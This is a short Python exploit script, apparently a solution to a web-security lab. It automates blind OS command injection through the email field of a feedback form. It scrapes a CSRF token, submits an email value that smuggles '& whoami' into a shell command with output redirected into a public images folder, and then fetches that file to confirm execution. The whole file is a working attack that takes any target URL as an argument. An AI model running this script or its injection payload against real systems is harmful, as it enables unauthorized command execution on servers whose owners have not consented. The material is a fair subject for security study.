import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'exploit@payload.com & whoami>/var/www/images/whoami.txt #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name':'exploit', 'email': command_injection, 'subject': 'exploit', 'message': 'test exploit'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)

    # Verify command injection
    checking_exploit_filename = '/image?filename=whoami.txt'
    res2 = s.get(url + checking_exploit_filename, verify=False, proxies=proxies)
    if (res2.status_code == 200):
        print("(+) Command Injection successful!")
        print("(+) Output of the command: " + res2.text)
    else:
        print("(-) Command Injection was not successful")
        print("Output: " + res2.text)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <URL>")
        print(f"(+) Example Usage: {sys.argv[0]} \"www.domain.com\"")
        sys.exit(1)

    url = sys.argv[1]
    print(">>>Exploiting blind command injection in email field and redirecting the output")

    s = requests.Session()
    exploit_command_injection(s, url)

if __name__ == "__main__":
    main()
